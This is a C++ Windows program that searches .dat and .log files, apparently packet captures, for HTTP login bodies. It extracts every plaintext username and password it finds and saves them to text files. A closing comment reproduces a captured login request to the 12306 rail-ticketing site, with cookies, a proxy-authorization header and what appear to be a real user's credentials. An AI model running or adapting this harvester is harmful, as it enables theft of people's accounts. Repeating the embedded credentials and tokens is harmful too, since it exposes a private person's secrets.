#include <windows.h>
#include <iostream>
#include <unordered_map>
#include <string>
using namespace std;

#define max_read_block_size 0x40000000


unordered_map <string, string> gMap;


int processMain(char * lpdata,int datasize,HANDLE hwrite) {
	char username[MAX_PATH];
	char password[MAX_PATH];

	int ret = 0;
	
	for (char * ptr = lpdata; ptr < datasize + lpdata; ) {
		if (memcmp(ptr,"\r\n\r\nusername=",lstrlenA("\r\n\r\nusername=")) == 0)
		{
			ptr += lstrlenA("\r\n\r\nusername=");
			char * end = strstr(ptr, "&password=");
			if (end > 0)
			{
				int namelen = end - ptr;
				if (namelen < 256)
				{
					memmove(username, ptr, namelen);
					*(username + namelen) = 0;

					end += lstrlenA("&password=");
					
					ptr = end;
					end = strstr(ptr, "&");
					if (end > 0)
					{
						int passlen = end - ptr;
						if (passlen < 256)
						{
							memmove(password, ptr, passlen);
							*(password + passlen) = 0;

							end += 1;
							ptr = end;

							DWORD dwcnt = 0;


							pair< std::unordered_map< string, string >::iterator, bool > retit;
							retit = gMap.insert(pair<string, string>(username, password));

							char szout[1024];
							int writelen = wsprintfA(szout, "username:%s,password:%s\r\n", username, password);
							WriteFile(hwrite, szout, writelen, &dwcnt, 0);

							printf(szout);
						}
						else {
							ptr++;
							printf("password len error\r\n");
						}
					}
					else {
						ptr++;
						printf("not found password end flag\r\n");
					}

				}
				else {
					ptr++;
					printf("username len error\r\n");
				}
			}
			else {
				ptr++;
				printf("not found &password=\r\n");
			}
		}
		else {
			ptr++;
		}
	}

	return 0;
}

int main() {
	gMap.clear();

	char szdir[MAX_PATH];
	int ret = 0;

	ret = GetCurrentDirectoryA(MAX_PATH, szdir);
	string curdir = string(szdir) + "\\";

	HANDLE hwrite = CreateFileA("result.txt", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hwrite == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileA error\r\n");
		getchar();
		return FALSE;
	}

	string findformat = curdir + "*.*";

	char * lpdata = new char[max_read_block_size + 16];
	if (lpdata <= 0)
	{
		printf("new buf error\r\n");
		getchar();
		return FALSE;
	}

	WIN32_FIND_DATAA stfd = { 0 };
	HANDLE hfind = FindFirstFileA(findformat.c_str(), &stfd);
	if (hfind == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFileA error\r\n");
		return FALSE;
	}

	do 
	{
		if (stfd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
		{
			if (strstr(stfd.cFileName, ".dat") || strstr(stfd.cFileName, ".log"))
			{
				string filepath = curdir + stfd.cFileName;

				LARGE_INTEGER fs = { 0 };
				fs.HighPart = stfd.nFileSizeHigh;
				fs.LowPart = stfd.nFileSizeLow;
				int times = fs.QuadPart / max_read_block_size;
				int mod = fs.QuadPart % max_read_block_size;

				LARGE_INTEGER lifs = { 0 };

				for (int i = 0; i < times; i++)
				{
					
					HANDLE hf = CreateFileA(filepath.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
					if (hf != INVALID_HANDLE_VALUE)
					{
						long fshigh = lifs.HighPart;
						ret = SetFilePointer(hf, lifs.LowPart, &fshigh, FILE_BEGIN);
						if (ret == INVALID_SET_FILE_POINTER)
						{
							CloseHandle(hf);
							printf("setfilepointer error code:%u,file:%s\r\n",GetLastError(),filepath.c_str());
							getchar();
							continue;
						}
						lifs.QuadPart += max_read_block_size;

						DWORD dwcnt = 0;
						ret = ReadFile(hf, lpdata, max_read_block_size, &dwcnt, 0);
						CloseHandle(hf);
						*(lpdata + max_read_block_size) = 0;

						printf("parsing file:%s\r\n",filepath.c_str());
						ret = processMain(lpdata, max_read_block_size, hwrite);
					}
				}

				if (mod)
				{
					HANDLE hf = CreateFileA(filepath.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
					if (hf != INVALID_HANDLE_VALUE)
					{
						DWORD dwcnt = 0;
						ret = ReadFile(hf, lpdata, mod, &dwcnt, 0);
						CloseHandle(hf);
						*(lpdata + mod) = 0;

						printf("parsing file:%s\r\n", filepath.c_str());
						ret = processMain(lpdata, mod, hwrite);
					}
				}
			}
		}

		ret = FindNextFileA(hfind, &stfd);
		if (ret <= 0)
		{
			break;
		}
	} while (1);

	CloseHandle(hwrite);
	delete[] lpdata;

	HANDLE hwrite2 = CreateFileA("map_result.txt", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hwrite2 == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileA error\r\n");
		getchar();
		return FALSE;
	}

	unordered_map <string, string>::iterator it;
	for (it = gMap.begin(); it != gMap.end(); it++)
	{
		char szout[1024];
		DWORD dwcnt = 0;
		int writelen = wsprintfA(szout, "username:%s,password:%s\r\n", it->first.c_str(), it->second.c_str());
		ret = WriteFile(hwrite2, szout, writelen, &dwcnt, 0);
	}

	CloseHandle(hwrite2);
	return 0;
}


/*
POST /passport/web/login HTTP/1.1
Host: kyfw.12306.cn
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Content-Length: 80
Accept: *//*
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: route=495c805987d0f5c8c84b14f60212447d; BIGipServerotn=368050698.38945.0000; BIGipServerpool_passport=384631306.50215.0000
Origin: https://kyfw.12306.cn
Proxy-Authorization: Basic cHJPeHlfdXNFcl9oNXhROjlDNFd1Mmtw
Referer: https://kyfw.12306.cn/otn/resources/login.html
X-Requested-With: XMLHttpRequest

username=chenshuang4114&password=518869fa40&appid=otn&answer=113%2C47%2C247%2C47
*/